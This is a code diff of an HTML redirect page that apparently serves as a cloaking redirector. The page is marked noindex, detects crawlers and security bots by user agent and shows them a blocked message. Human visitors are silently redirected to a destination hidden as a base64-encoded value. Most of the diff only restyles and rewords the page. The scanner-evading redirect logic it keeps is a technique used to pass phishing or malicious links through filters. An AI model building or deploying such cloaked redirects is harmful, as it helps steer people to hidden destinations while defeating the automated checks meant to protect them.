@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading...</title>
+  <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="noindex,nofollow">
 
@@ -11,39 +11,44 @@
 
   <style>
     body {
-      background: linear-gradient(145deg, #e2e8f0, #f8fafc);
-      min-height: 100vh;
+      background-color: #ffffff;
+      color: #222;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-family: 'Segoe UI', sans-serif;
     }
 
-    .card {
-      max-width: 420px;
-      padding: 30px;
-      border-radius: 1.25rem;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-      background: white;
+    .redirect-wrapper {
+      width: 100%;
+      max-width: 500px;
+      padding: 2rem;
       text-align: center;
     }
 
     .spinner-border {
-      width: 3rem;
-      height: 3rem;
-      margin-bottom: 20px;
+      width: 2.5rem;
+      height: 2.5rem;
+      margin-bottom: 1rem;
       color: #0d6efd;
+    }
+
+    @media (max-width: 480px) {
+      .redirect-wrapper {
+        padding: 1.5rem 1rem;
+      }
     }
   </style>
 </head>
 <body>
 
-<div class="card">
-  <div id="loader">
-    <div class="spinner-border" role="status"></div>
-    <h4 class="mt-3" id="status-title">Redirecting you...</h4>
-    <p id="status-text">Please wait a moment.</p>
-  </div>
+<div class="redirect-wrapper">
+  <div class="spinner-border" role="status"></div>
+  <h4 id="status-title">Please wait...</h4>
+  <p id="status-text">We are redirecting you to the destination.</p>
 </div>
 
 <script>
@@ -64,27 +69,19 @@
   ];
 
   const ua = navigator.userAgent;
-  let isBot = false;
-
-  for (let pattern of botPatterns) {
-    if (pattern.test(ua)) {
-      isBot = true;
-      break;
-    }
-  }
+  let isBot = botPatterns.some(p => p.test(ua));
 
   const title = document.getElementById("status-title");
   const text = document.getElementById("status-text");
 
   if (!encoded) {
     title.innerText = "Invalid Link";
-    text.innerText = "The link appears broken or incomplete.";
+    text.innerText = "This link is missing or incorrect.";
   } else if (isBot) {
-    title.innerText = "Content Not Available";
-    text.innerText = "Please open this link manually in your browser.";
+    title.innerText = "Content Blocked for Bots";
+    text.innerText = "Please open this link in your real browser.";
     document.querySelector('.spinner-border').style.display = "none";
   } else {
-    // Delay for human then redirect
     setTimeout(() => {
       const targetUrl = atob(encoded);
       window.location.href = targetUrl;
